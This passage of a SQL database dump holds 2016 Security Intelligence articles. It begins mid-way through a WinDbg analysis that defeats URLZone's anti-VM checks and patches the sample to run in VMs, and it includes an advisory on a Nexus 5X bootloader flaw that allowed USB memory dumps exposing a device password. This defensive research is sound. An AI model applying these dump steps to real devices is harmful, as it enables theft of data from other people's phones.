Let’s look at this call: The API is called using a pointer located at 0x41d11c. Looking at that address with the display dword symbols (dds) command reveals the following information: This just revealed the dynamically constructed import address table (IAT) that indicates that URLZone builds its own IAT. It is possible to find out where in the code this takes place by reverting to an earlier snapshot, placing a memory write BP on this specific location and then seeing which function fills it with a pointer to LoadLibraryA. We then executed URLZone with the debugger until it terminates. We can see that the dynamic IAT is now more complete: From this, we can deduce that URLZone loads new functions into its IAT on the fly. At this point, we have most of the addresses, but not all of them, because the program terminated prematurely. Also, keep in mind that not all code branches are actually reached on every execution, so one may never have the complete IAT when solely relying on dynamic methods. Another noteworthy point is that the strings were decrypted at this point: We just saw that URLZone terminated without infecting the machine. Here is the call stack after termination: The malicious code called RtlExitUserThread, effectively terminating the execution. Here is the call itself: We see a call to a function pointed by the ECX register, then a check if EAX equals 0 and then a branch that wasn’t taken in our case, leading us to the call of RtlExitUserThread. A quick test here shows that changing the value of the EAX register, which means taking the branch to 0x414f01, indeed skips the call to RtlExitUserThread, and URLZone continues execution. To analyze the function at ECX, we first need to add the IAT information into our IDB.   is a common tool used for this purpose, but it can also be achieved with WinDBG. This is how a part of URLZone’s VM detection function appears while pointed by the ECX register: The SetupDi calls here are device installation functions, which are used for the enumeration of all devices installed on the machine. Each device name is thus searched for strings that may be indicative of VMs (“VMware,” for example). If such a string is found, the function returns 0, thus terminating URLZone’s execution. But this is not the end. URLZone possesses two other interesting VM detection methods that prevent it from running in virtual machines: URLZone checks its own file name for substrings like “Sample,” “Virus” and “Sandbox” before executing. If it finds any, it terminates (see image below). URLZone also uses timing checks as a method of VM detection. The malware calls the   instruction 10 times and uses the   RDTSC instruction to calculate the total time required to execute these calls. If the total time is longer than defined by the developer, the malware will terminate. The logic behind using this check is that on a VM, CPUID triggers a hypervisor call; those take significantly longer than when running CPUID on a physical machine. When manually controlling the program’s flow using the debugger and bypassing the VM detection tricks, another process creation emerges in suspended state: a second process hollowing. At first, this may appear the same as the first process hollowing when the malware initially launched. In reality, the process created here is explorer.exe. This time, malicious shellcode is injected into explorer.exe to poison it. This is a stealthier method than simply injecting a complete PE, as URLZone did in the previous case. Analyzing the shellcode would be time-consuming. The code starts off by dynamically resolving some APIs and continues to allocate memory within the newly created explorer.exe process. It writes data into the allocated memory, transfers control flow to the newly written data and then repeats. Eventually, the new explorer.exe terminates. To save time on the analysis, after reverting to a snapshot taken just before the creation of the suspect explorer.exe process, we launch Process Monitor and detach the debugger (allowing execution to continue). After filtering, we see the following: Per the above log, we can see a few things: Hence, our hollow explorer.exe is being used here by URLZone to inject code into the original explorer.exe. Let’s take a look by attaching to the original explorer.exe (PID 1660) and running “.imgscan” on it to display all modules loaded to the process. The .imagscan command scans virtual memory for image headers: The result shows an image with protections of 0x40 (RWX), sized 0x23000, which did not exist before. This is the same image we had analyzed earlier on in the initial URLZone file. In reality, this module, inside the original explorer.exe, is URLZone’s main module, which is in charge of monitoring for browser processes and injecting the financial module into them, among other functions. At this point, URLZone’s multiple protections were overcome, and it was successfully installed on a VM. Taking a memory dump of the module injected into explorer.exe shows us that the strings are decrypted at this point, and it is possible to add the IAT data to IDA Pro, as explained above. We are now able to analyze an infected VM and statically examine the unpacked main module, including its visible strings and imports. But what if we need to infect another machine, say a 64-bit OS? We would not wish to manually repeat the process. It would be great if we had a sample that would run on a VM without all the manual labor. To do so, we can take the child process dump and statically patch the code so it never reaches the RtlExitUserThread call. This can be done as follows: This method ensures the ability to infect virtual machines with working URLZone samples without dealing with its protections every time. Below is a working patch example: Note that the “call ecx” at the top of both images is the call to the VM detection function, while “call ebx” on the before side is the call to RtlExitUserThread. We’ve completed our goals for this post. We obtained: If we are to research future versions of this malware family, we should automate as much of this process as possible (read: all of it). Some options to consider for this purpose would be: URLZone is a longstanding threat that emerged in 2009 and has been around for many years in cybercrime terms. The closed gang that operates this malware typically targets  , but interestingly added Japanese banks to its target lists at the beginning of 2016. As demonstrated by the evolution of its continually advancing anti-research protection layers, URLZone exhibits a technical sophistication indicative of experienced developers. Even though it attracts less attention than other financial malware such as Gozi or Neverquest, for example, URLZone is no less sophisticated or problematic a threat for the financial sector. This malware’s under-the-radar behavior is part of the reason URLZone has managed to remain active for such a long time since its inception, while more dominant Trojans are more easily detected, analyzed and stripped of their secrets soon after they emerge. Although it is a sophisticated and evolving threat, URLZone attacks can be detected and their malicious effects mitigated. To help stop this type of threat, banks and service providers can opt to deploy adaptive   and   with malware intelligence that provides real-time insight into fraudster techniques and capabilities, designed to address the relentless evolution of the threat landscape.', '\'Advanced Threats\', \'Antivirus\', \'IBM X-Force Research\', \'Malware\', \'URLZone\', \'Virtual Machine (VM)\', \'X-Force\'', 'https://securityintelligence.com/fighting-fire-with-windbg-breaking-urlzones-anti-vm-armor/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (198, 'Undocumented Patched Vulnerability in Nexus 5X Allowed for Memory Dumping via USB', 'Roee Hay', '2016-9-1', 'The   Application Security Research Team recently discovered a previously undocumented vulnerability in older versions of Nexus 5X’s Android images (6.0 MDA89E through 6.0.1 MMB29V or bootloaders bhz10i/k). The first nonvulnerable version is MHC19J (bootloader bhz10m), released in March 2016. The vulnerability would have permitted an attacker to obtain a full memory dump of the Nexus 5X device, allowing sensitive information to be exfiltrated from the device without it being unlocked. Clearly such an ability would have been very appealing to thieves. Fortunately, IBM is not aware of any exploitation attempts of this vulnerability. The vulnerability could have been exploited by physical or nonphysical attackers with Android Debug Bridge (ADB) access to the device. A nonphysical attacker could gain ADB access by infecting an ADB-authorized developer’s PC with   or by using malicious chargers targeting ADB-enabled devices. Using such chargers requires the victim to authorize the charger once connected. IBM disclosed this issue to Android a few months ago, and the Android Security Team recently acknowledged it was patched. The vulnerability and its exploitation are rather straightforward: The attacker reboots the phone into   mode, which can be done without any authentication. A physical attacker can do this by pressing the volume down button during device boot. An attacker with ADB access can do this by issuing the   command. The fastboot mode exposes a USB interface, which, on locked devices, must not allow any security-sensitive operation to be commanded. However, we discovered that if the attacker issued the   command via the fastboot USB interface, the bootloader would be forced to crash: [38870] fastboot: oem panic \n[38870] panic (frame 0xf9b1768): \n[38870] r0 0x0f9972c4 r1 0x4e225c22 r2 0x7541206f r3 0x74206874 \n[38870] r4 0x0f9972e8 r5 0x0f96715c r6 0x0f9972f0 r7 0x0f9670ec \n[38870] r8 0x0f92e070 r9 0x00000000 r10 0x00000000 r11 0x00000000 \n[38870] r12 0x0f92e070 usp 0x0f9650ec ulr 0x00000000 pc 0x0f99c75c \n[38870] spsr 0x0f936964 \n[38870] fiq r13 0x0f989490 r14 0x00000000 \n[38870] irq r13 0x0f989490 r14 0x0f9004f4 \n[38870] svc r13 0x0f9b16f0 r14 0x0f92dd0c \n[38870] und r13 0x0f989490 r14 0x00000000 \n[38870] sys r13 0x00000000 r14 0x00000000 [38880] panic (caller 0xf936964): generate test-panic \n \n The problem is that in the vulnerable versions of the bootloader, such a crash would cause the bootloader to expose a serial-over-USB connection, which would allow an attacker to obtain a full memory dump of the device using tools such as QPST Configuration. The resulting memory dump files would then be available under the attacker’s PC.\n To illustrate the severity of the attack, as the victim, I set the device password to “buggybootload3r” and then searched it in the memory dump:\n > hexdump DDRCS0_0.BIN | grep -10 bootloa\n ..\n 2675d060: 6f 00 69 00 64 00 2e 00 – 73 00 65 00 72 00 76 00 o.i.d… s.e.r.v. \n2675d070: 69 00 63 00 65 00 2e 00 – 67 00 61 00 74 00 65 00 i.c.e… g.a.t.e. \n2675d080: 6b 00 65 00 65 00 70 00 – 65 00 72 00 2e 00 49 00 k.e.e.p. e.r…I. \n2675d090: 47 00 61 00 74 00 65 00 – 4b 00 65 00 65 00 70 00 G.a.t.e. K.e.e.p. \n2675d0a0: 65 00 72 00 53 00 65 00 – 72 00 76 00 69 00 63 00 e.r.S.e. r.v.i.c. \n2675d0b0: 65 00 00 00 00 00 00 00 – 3a 00 00 00 00 0d c4 b6 e……. …….. \n2675d0c0: 6d 42 cd 0a b1 00 00 00 – 00 00 00 00 00 00 00 00 mB…… …….. \n2675d0d0: 00 00 00 00 00 92 86 33 – e3 79 92 8b b7 d4 77 f5 …….3 .y….w. \n2675d0e0: 94 7f d0 2b fb b8 6e cc – 98 3b 9a a7 0d 7c 60 f6 ……n. …….. \n2675d0f0: d7 70 68 c2 14 01 00 00 – 0f 00 00 00 62 75 67 67 .ph….. …. \n2675d100: 79 62 6f 6f 74 6c 6f 61 – 64 33 72 00 62 75 67 67  .bugg\n …\n As you can see, the password can be found on the fetched memory dump. Physical attackers can then successfully boot the platform, which further allows them to impersonate the user, access data stored on the device and more.', '\'Android\', \'Android Vulnerability\', \'Application Security\', \'IBM X-Force Research\', \'Vulnerability\', \'X-Force\'', 'https://securityintelligence.com/undocumented-patched-vulnerability-in-nexus-5x-allowed-for-memory-dumping-via-usb/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (199, 'Anti-ROP: A Moving Target Defense', 'Ayman Jarrous', '2016-9-1', 'The recent announcement by Intel and Microsoft about their   has some experts waving farewell to return-oriented programming (ROP) attacks. But others question whether this hardware-based solution can really eradicate malware infections based on ROP attacks. A new software-oriented solution from IBM Research — Haifa, however, may hold the promise for immediate defense against ROP. Almost 90 percent of exploit-based software attacks use the hostile ROP technique in the chain of attack. Over the years, much research has been done to find a solution. Until now, the available techniques have had limited success, and none have taken an effective preventive approach. At IBM Research — Haifa, we developed an anti-ROP technique. It’s an advanced shuffling process that shifts key elements of code, making it harder to exploit vulnerabilities and take control of a program. So how does ROP work, and how does our novel “moving target” approach stop an ROP attack before it happens? ROP is an exploit technique that allows an attacker to take control of a program flow by smashing the call stack to execute instruction sequences. The attacker borrows gadgets, or small pieces of code, from the hijacked program to execute malicious code. Cybercriminals use ROP because it can easily bypass data execution prevention (DEP), a technology implemented in hardware and software to prevent code injection and execution. If we can break the ROP phase of the chain attack, we can break the entire chain of attack. This prevents the execution of  . Anti-ROP performs exactly that preemptive process. It prevents hijacking before it happens. One of the many techniques developed to prevent ROP attacks is address space layout randomization (ASLR), a process implemented in almost all operating systems. ASLR randomizes the address bases of the sections, forcing the attacker to guess the location of the gadgets. However, some parts and files are not randomized, leaving weak spots in the program that attackers can still use to invoke their malicious intentions. Microsoft and Intel recently joined forces to strengthen hardware protection against the widespread use of ROP. They collaborated to integrate CET in Intel hardware. It uses a shadow stack and pointers to prevent cybercriminals from misusing legitimate code. The CET specification “sets a direction of intent to leverage the fixed hardware architectures of the Central Processing Unit to establish controls to help prevent and interfere with code-reuse attacks,” explained Matthew Rosenquist, an Intel cybersecurity strategist, as quoted by  . The solution will not be deployed in all systems and will not be backward-compatible. It does require upgrading hardware platforms and recompiling the software system. The software-based anti-ROP solution is easy to install, and it’s compatible with all platforms and operating systems. There is no need to upgrade or modify the system. Put simply, it is a type of advanced randomization process where the entire code section is randomized. Attackers building a ROP attack assume that the gadgets they need are in absolute addresses or shifted by constant bytes. If they can detect the shift of one gadget, they can detect the shifts of all gadgets. This is where our novel solution comes in: It is a moving target defense to ensure that detecting the shift of one gadget does not reveal the rest, always staying several steps ahead of the attacker. Our solution can be implemented on Windows, Linux and other operating systems. It analyzes the PE/ELF files, builds chunks composed of a number of function blocks and reorganizes them. Every phase of the process can be invoked online or offline. The randomized file created has the same functionality as the original file, so the randomization process requires intervention in the structure of the file, fixing headers, updating branches and tables, etc. Our solution challenges the attacker to guess all address locations of the gadgets. Unlike in ASLR technology, finding a gadget in one block definitely does not reveal the addresses of the other gadgets. In addition, our solution does not require the source code of a program. It supports legacy code, is backward compatible and does not require hardware support. The anti-ROP solution can be deployed in various ways and forms. It can be installed as a  , hooked in the system and more. We have already deployed this technique on a number of users’ Windows machines. The anti-ROP solution can block memory corruption zero-day attacks. Beyond that, it can detect attack attempts at almost no performance cost and without having to install new online components. Our evaluations have shown that this software solution can   that use ROP in their attack chain, bringing new levels of security to various applications. Anti-ROP security is also being incorporated within the  , an EU-funded consortium targeted at providing end-to-end security across the hardware and software stack. In this context, anti-ROP is being used to provide a higher level of protection to systems by preventing hackers from leveraging well-known legacy code to generate attacks.', '\'Malicious Code\', \'Malware\', \'Security Research\', \'Threat Protection\'', 'https://securityintelligence.com/anti-rop-a-moving-target-defense/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (200, 'Want Fries With Your EXTRABACON or EPICBANANA? Cisco Addresses Two New Vulnerabilities', 'Lyndon Sutherland', '2016-8-31', 'EXTRABACON and EPICBANANA sound like something you might find on the menu at your local drive-thru, but they are actually names given to exploit code targeting vulnerabilities in Cisco ASA and PIX devices and the Firewall Services Module. The exploits came to light in a large dump of code by an entity going under the name of the  . Cisco published two security advisories to address these vulnerabilities. EXTRABACON ( ) is a vulnerability in versions 1, 2c and 3 of the Simple Network Management Protocol (SNMP) contained in various versions of Cisco ASA, ASAv, Firepower, FWSM, ISA and PIX products. An affected product would need to have SNMP enabled and the port (by default UDP 161) exposed to an attacker. An attacker would also need to know the configured SNMP community string. The vulnerability is caused by improper bounds checking. A remote attacker can exploit it by sending specially crafted SNMP packets. These packets may overflow a buffer, potentially resulting in the execution of arbitrary code on the system or causing the device to reload.  released an advisory and a  , both of which address this vulnerability. EPICBANANA ( ) affects Cisco’s ASA, PIX and FWSM. The vulnerability could allow a local authenticated attacker to connect using a protocol such as Telnet or SSH, and then execute arbitrary code or cause a denial-of-service (DOS) condition on a vulnerable system. EPICBANANA is caused by an error in the command-line interface (CLI) parser. An attacker could exploit the vulnerability by invoking invalid commands. It is important to address these vulnerabilities because the exploits are publicly available and the affected devices are high-value targets. A breach of these devices can seriously damage an organization’s security posture. An attacker could   to access internal systems from the internet and expose sensitive data, such as payment card information or electronic health records. The first step a security team should to take is to determine if there are vulnerable devices within the organization’s infrastructure. Both advisories provide tables listing the affected and fixed versions of code. In the case of the EPICBANANA vulnerability and ASA devices, some users may already be running secure versions of code since the vulnerability was first addressed in version 8.4(3). However, versions 8.5, 8.6, 8.7 and 9.0 are also affected. The table below from the Cisco advisory regarding the   shows the details: The table from the Cisco advisory addressing the   shows details of the affected and fixed versions: Cisco released updates to address both vulnerabilities.   urged all organizations running vulnerable versions of code to upgrade as soon as possible. It is important to note that the PIX and FWSM have passed their end of life, meaning no software updates will be provided for these devices. In addition to patching, or as a temporary mitigation until patching can be completed, the vulnerabilities can be controlled by either disabling SNMP, Telnet and SSH. It can also be done by strictly limiting network connectivity to the associated ports, usually TCP ports 22 and 23, and TCP and UDP ports 161 and 162. It must be noted, however, that these mitigations do not remove the vulnerabilities; they simply limit the ability of potential attackers to exploit them. For additional best practices in securing Cisco devices, we highly recommend adhering to the “ .” As always when it comes to taking action in response to vulnerability advisories, organizations must have an inventory of critical assets so they can identify affected infrastructure, and prioritize patching and mitigation activities. In particular, devices that face the internet, protect sensitive data or handle connections from third parties should take priority. Audits of logs and network activity can help determine if you’ve already been compromised as a result of vulnerabilities such as EPICBANANA or EXTRABACON. This would enable you to activate your   as soon as possible, hopefully before data is stolen or destroyed.', '\'Advanced Threats\', \'Buffer Overflow\', \'Cisco\', \'IBM X-Force Exchange\', \'Vulnerabilities\', \'Vulnerability\', \'X-Force\'', 'https://securityintelligence.com/want-fries-with-your-extrabacon-or-epicbanana-cisco-addresses-two-new-vulnerabilities/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (201, 'The Increasing Dangers of Code Hooking', 'David Strom', '2016-8-29', 'Security researchers discovered a series of implementations of an old type of exploit known as code hooking. These implementations are increasing and becoming more dangerous. Operating under the name of Captain Hook, these exploits make use of code injection techniques that could cause numerous vulnerabilities and potentially affect thousands of products. Let’s take a closer look at what’s going on with this exploit. Code hooking is a very intrusive coding operation where mainly OS function calls are intercepted by a program to alter or augment their behavior.   do this all the time when they discover a piece of malware or when some modified routine is behaving badly. However, code hooking has other purposes too, such as general program debugging, monitoring and intercepting messages, according to the  . The problem is that hooking can be used for both good and evil; it can be used not just to  , but also to help malware authors perform their dirty business. Code hooking can hide a rootkit, for example, so it looks more benign, or make it harder to detect what the malware is actually doing on a system. Code hooking is essentially how most man-in-the-browser attacks occur. In this case, the “normal” program calls a hook, stops what it is doing and passes control to the malware, which picks up its operation and continues to execute the exploit. One of the first instances of this kind of behavior was the  . Typically, these hooks allow intrusive software to intercept and monitor API calls. According to  , “most anti-exploitation solutions monitor memory allocation functions, such as VirtualAlloc and VirtualProtect, in an attempt to detect vulnerability exploitation.” The rest of the article goes into further detail how hooking is accomplished and how a typical hooking engine is constructed for evil purposes. Code hooking will likely be with us a long time. It’s an incredibly tempting target for   authors, who will continue to use it for their criminal activities. Prepare to protect your enterprise by studying the malware’s actions and recognizing the attack when your scans detect it.', '\'Exploit\', \'Malicious Code\', \'Malware\', \'Man-in-the-Browser (MitB)\', \'Man-in-the-Browser (MitB) Malware\', \'Operating System (OS)\'', 'https://securityintelligence.com/the-increasing-dangers-of-code-hooking/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (202, 'Ramnit Rears Its Ugly Head Again, Targets Major UK Banks', 'Limor Kessem', '2016-8-26', 'IBM X-Force researchers recently reported that the Ramnit Trojan has relaunched, targeting six major banks in the U.K. After a silent period of about eight months, researchers observed that Ramnit’s operators set up two new live attack servers and a new command-and-control (C&C) server. They launched an infection campaign in the U.K. and are spreading new Trojan configurations to equip the malware with webinjections designed to target personal banking users. Internally, the Ramnit payload does not appear to have changed in any significant way; its operation, architecture and encryption algorithms remained the same. Some parts were updated, such as the “Hooker” module, which saw some renovation and was renamed “Grabber.” Also known as a Spy Module, this module is designed to hook the browser, monitoring URL access, enabling data theft in real time and displaying webinjections to the victims. Ramnit’s DriveScan module remained unchanged. This component enables the Trojan to scan the drive for files with interesting keywords, such as “wallet,” “passwords,” and the names of banks targeted in the configurations. Ramnit’s operators gather that extra information to ensure they don’t miss out on any financial details or credentials victims may be keeping on their endpoints. Although Ramnit originally features a   module, it does not seem to deploy it immediately. Nonetheless, a VNC module can be dynamically fetched from the malware’s control server at the attacker’s discretion and launched for use at any point. The configuration side is where we can see that Ramnit has been preparing for the next phase, with new attack schemes built for real-time fraud attacks targeting online banking sessions. Not all attacks have to happen in real time or from the victim’s device; Ramnit’s operators can also gather credentials from infected users and use them to commit account takeover fraud from other devices at a later time. Ramnit is an evolving, persistent banking Trojan that emerged in 2010 in the more simplistic form of a self-replicating worm. As the malware project evolved, Ramnit’s developers chose to   and, in 2011, Ramnit donned on-the-fly data theft modules alongside webinjection capabilities borrowed from the Zeus Trojan’s exposed source code. It has been an active banking Trojan ever since, with remote control capabilities and extensive target lists that even included mule recruitment in the past. According to X-Force Research, this malware saw its most prolific bank fraud phase in 2014, when it was named the fourth most active financial Trojan in the world behind Dyre, Neverquest and Dridex. \n Ramnit’s activity came to halt in early 2015, when a Europol operation attempted to   by taking down botnets operated by Ramnit’s masters. Unfortunately, Ramnit did not completely die. A few days after the takedown, some parts of the  . The takedown attempt must have alerted Ramnit’s operators to the possibility that they could be captured by law enforcement, however, and activity subsequently died down for a while. In December 2015, IBM X-Force reported   that targeted banks and e-commerce in Canada, Australia, the U.S. and Finland. Since then, however, Ramnit servers have been silent — until now. As of July 2016, Ramnit has been preparing new attack schemes, testing, setting up an infection campaign and reconnecting the wires to mount two new attack servers. According to X-Force threat intelligence, Ramnit appears to be operated by a private, closed cybergang. Ramnit’s source code has not been openly sold or shared with other cybercriminals, and we’ve observed no underground chatter. From what we’ve learned so far, there was no change in Ramnit’s status in that sense. It is possible that a new gang has picked the project up, but attribution remains vague. Ramnit’s current targets appear to be limited to six major U.K. banks, but X-Force researchers expect the list to expand in the coming days or weeks. The malware’s operators are spreading more than one configuration out to new infected bots, with sophisticated social engineering injections and in-session fraud automation all wrapped into the same attack scheme. Ramnit’s infection vectors in the past included malvertising and malware-laden spam. Ramnit’s operators have already  , such as the  . We expect to see them reach out for the same methods in this new activity phase. Antivirus engines can take a while to detect Ramnit, and in many cases do not detect it at all. Some of the aliases by top AV engines for this variant are: The Ramnit banking Trojan is an evolving threat. It is designed to manipulate online banking sessions to steal user credentials and perform money transfer fraud attacks. To help stop Ramnit, banks and service providers can use adaptive   with malware intelligence that provides real-time insight into fraudster techniques and capabilities. Most cases of malware infections, including Ramnit, begin with a malware-laden spam email that lures victims into opening an attachment by indicating it is an invoice or another important document. If users are not expecting this document, their best bet is to delete the email immediately and then directly check their accounts or contact their service provider to look into the matter. Those who frequently bank away from home are advised to never access any of their personal accounts from public computers. Online banking should be carried out from trusted devices that are protected by security solutions.', '\'Advanced Threats\', \'Banking Trojan\', \'IBM X-Force Research\', \'Malware\', \'Ramnit\', \'Trojan\', \'X-Force\'', 'https://securityintelligence.com/ramnit-rears-its-ugly-head-again-targets-major-uk-banks/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (203, 'Understanding the SPF and DKIM Spam Filtering Mechanisms', 'Koen Van Impe', '2016-8-24', 'Remember back in the days when people declared, “We will fight spam and stop it?” It’s 2016, and   for the average user. Despite all the good intentions and  , we are still unable to properly filter unwanted messages and keep our mailboxes clean. The use of blocklists, such as   and  , is efficient, but it often turns into a game of whack-a-mole. The experience has taught us that unsolicited mail cannot be minimized using just a single tool or solution. Rather, it takes a combination of different techniques to reduce unwanted mail. Removing it all together is nearly impossible, but we can limit the burden it puts on us and on our computer cycles. Limiting the amount of unwanted messages also has a positive influence on your overall security health. A lot of malware is still being sent via spam; keeping these messages out of your users’ mailboxes prevents further mayhem. This article covers two techniques that can be used to limit the amount of spam messages. Sender Policy Framework (SPF) is an open standard specifying a technical method to prevent sender address forgery. The current version of SPF is SPFv1, which protects the envelope sender address. The detailed SPF specifications can be found in  . SPF uses a DNS TXT record in the DNS zone file to limit the number of servers that are allowed to send email on behalf of a domain name. Basically, this is tells the receivers, “messages for my domain should only come from these servers.” SPF is concerned with the identity of the sender of a mail message, or the “mail from” header, which is specified in the  . An SPF record consist of two blocks, called mechanisms. Basic mechanisms contribute to the framework but do not designate a specific authorization scheme; they can, for example, instruct SPF to look up external SPF records. Designated mechanisms are used to identify a set of IP addresses as being permitted or not permitted to send email. Below is an example of an SPF record for an example domain: This record tells us that the IPv4 addresses 192.0.2.1 and 192.0.2.129 are allowed to send email for the designated domain. With the use of “-all,” we stress that only mail that matches this pattern of IPv4 addresses is allowed. DomainKeys Identified Mail (DKIM) is an email authentication method designed to detect email spoofing. It is a way to sign and verify email messages at the message transfer agent (MTA) level using public and private keys. The public keys are published in DNS TXT records. DKIM authenticates the source and its contents. From a high-level point of view, the sender signs the message, both headers and content. The owner of the private key is the only one who should be able to create this signature. The receiver then extracts the signature from the headers, queries DNS for the public key and checks the validity of the signature. Because the data is stored in the DNS servers, only the rightful owners of the domain should be able to set up the public/private key pair and publish the public key. The detailed specifications of DKIM can be found in  . In practice, the receiver verifies the sender information by doing a DNS query for a TXT record consisting of “selector” + _domainkey + “domain.” The selector is set in the message and defines the actual DNS query for getting the TXT RR postpended with _domainkey. For example, the following DKIM signed message contains this signature: This particular message results in a DNS query: Both mechanisms make heavy use of DNS, or the domain name system. DNS is a decentralized naming system for computers. DNS is at the core of our current internet; it resolves human-understandable names to computer-understandable names and vice versa. It comes as no surprise that having a reliable, secure, well-protected and well-maintained DNS infrastructure is essential — not only for these spam protection mechanisms, but for the sake of having a proper and  . In normal circumstances, the DNS records can only be changed by the domain owners. If the filtering data, be it either SPF or DKIM, is published in these DNS records, you can be relatively confident they are put there by the legitimate owner. This might come as a shock, but neither SPF nor DKIM are spam filters. They merely help you (and, in fact, the servers that route email) decide if a certain message is likely to be an unwanted email message or not. Both mechanisms contribute in the process of verifying that the source of an email is not falsified. As such, SPF and DKIM can help in protecting against phishing, but it would be foolish to utilize them as your only line of defense. Spammers can also make use of SPF and DKIM to give more value to their messages. They are able to bypass some verification steps by utilizing disposable or compromised server infrastructure. This is important: Passing an SPF or DKIM check should not prompt you to disable all the other security checks. SPF and DKIM do not deal with the end users. Both mechanisms operate at the server level, and most users will not even notice that they are in place. Although they are designed for resilience, both mechanisms can also be attacked. SPF records themselves can be used to launch attacks. By including a reference to a victim in an SPF record, an attacker can cause receivers to launch DNS queries against the victim’s infrastructure. Because the verifiers conduct these DNS queries and not the attacker, this leaves room for attackers to hide their true source. Similarly, actors can launch DNS lookup amplification attacks by using the “a” or “mx” SPF mechanisms. Attackers merely have to include the records of their intended victims. By itself, DKIM does not provide protection against replay attacks on messages that already have a verified signature. This means that someone can resend a message with the original signature remaining verifiable, but with new headers inserted by the attacker. Some of these newly inserted headers will break   compliance, but this is of little concern to cybercriminals. As long as the mail servers process the message, their goal is achieved. The signer can provide protection by listing the headers that are only allowed to appear once (see section 8.15  ). This is done by adding this email header twice to the ‘h’ tag. For example, the list of signed email headers should not be in this format: Instead, it is more advisable to use: Implementing SPF and DKIM is not hard: You just need a bit of planning, inventory data and, obviously, some time. SPF requires little or no effort; the biggest issue is probably getting to know what servers you are using to send email. Proper inventory and configuration management can help you with this. You can use the   to get additional information on the exact syntax that needs to be used together with a set of tools for testing and implementing SPF records. DKIM requires a bit more work and planning ahead, but with the right help, it’s a hurdle that you can pass without too much of an effort.   already contain a set of information, but you should certainly point your attention towards the   for technical details and operational issues. Despite possible attacks on the protection mechanisms, SPF and DKIM do serve a real purpose in limiting the amount of unsolicited email that ends up in your users’ mailboxes. It is important to look at spam filtering as a collaborative, multistage process. The solution for spam protection is not just one technology; it’s a combination of different technologies that all add up to mark a specific message coming at a specific time frame as reasonably safe — or not.', '\'Domain Name System (DNS)\', \'Email\', \'Email Spoofing\', \'Spam\', \'Spam Emails\'', 'https://securityintelligence.com/understanding-the-spf-and-dkim-spam-filtering-mechanisms/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (204, 'GozNym’s Euro Trip: Launching Redirection Attacks in Germany', 'Limor Kessem', '2016-8-23', 'The GozNym banking malware, a Trojan hybrid  , continues to increase its activity against banks in Europe. More recently, the X-Force team discovered redirection attacks launched by the GozNym crew in Germany, targeting 13 banks and their local subsidiaries. The new redirection schemes come in addition to webinjection-based attacks for all the targeted brands, demonstrating GozNym’s significant investment in German-language attack capabilities. GozNym has been intensifying its activity across Europe, showing a very sharp peak in activity in August 2016. In numbers, this peak accounts for a 3,550 percent hike since July 2016 and a 526 percent rise compared to the total number of attacks since the birth of the GozNym hybrid (April to July 2016).  emerged in April 2016, launching an aggressive attack campaign on 24 banks in North America. Per X-Force Research, two weeks after the initial discovery, GozNym’s operators began spreading a new configuration designed to target corporate, small and medium businesses banking, investment banking and consumer accounts at Polish banks. That was also when its operators began   for the first time — a rare capability in the cybercrime landscape. By June 2016, GozNym redirection attacks   Now, two months later, redirection attacks are coming to Germany. Looking at GozNym’s timeline, it is evident that the gang operating the malware has the resources and savvy to deploy sophisticated cybercrime tactics against banks. The project is very active and evolving rapidly, making it likely to spread to additional countries over time. Notably,  , the original contriver of malware redirection attacks, only managed to deploy them in English-speaking countries and in Spain. GozNym’s operators already have three distinct geographies under attack — in three different languages and in countries that have different banking systems. \n IBM X-Force analysts looked into current underground trends focused on the German financial sector and have found that the topic is rather trendy. Fraudsters target Germany in the same way that they target other geographies: They look for bank account credentials, SMS interception schemes and accomplices to work with on the cashing out of stolen funds. The overall chatter is quite indicative of the fact that cybercriminals have the same interest in German banks as they do in other parts of Europe, adapting their schemes to the local banking systems to avoid detection and failed fraud attempts. GozNym is a hybrid banking Trojan believed to be created by the cybergang that operates the Nymaim dropper. The original group has been active since 2013, using its malware to launch vast ransomware campaigns that resulted in millions of infected endpoints around the globe. With the new GozNym Trojan and the fresh attack schemes added to the malware in the past few months, it is clear that GozNym attacks are evolving quickly, turning it into a serious player in the financial threat landscape.   expects to see further rises in GozNym attacks in the coming weeks,as well as the expansion of redirection attacks to additional banks in the near future. From a global perspective, GozNym attack volumes, as monitored by IBM Security, have been rising. The malware already ranks eighth on the top 10 most active financial Trojans list, adjacent to longer-standing malware gangs such as Tinba, Rovnix and GootKit. IBM Security has studied GozNym malware and its various attack schemes, and we can help banks and other targeted organizations learn more about this high-risk threat. Banks and service providers can take steps toward stopping threats such as GozNym by utilizing adaptive  . Users can prevent malware infections on their endpoints by making sure their operating systems are up to date, updating frequently used programs and deleting programs they don’t use. Sites typically used as infection hubs should be avoided. As always, be sure never to click on links or open attachments in unsolicited email. Additionally, users should never access their personal accounts from public computers.', '\'Advanced Threats\', \'Banking Trojan\', \'Fraud\', \'Gozi\', \'Gozi Trojan\', \'GozNym\', \'IBM X-Force Research\', \'Malware\', \'Nymaim\', \'Trojan\', \'X-Force\'', 'https://securityintelligence.com/goznyms-euro-trip-launching-redirection-attacks-in-germany/');
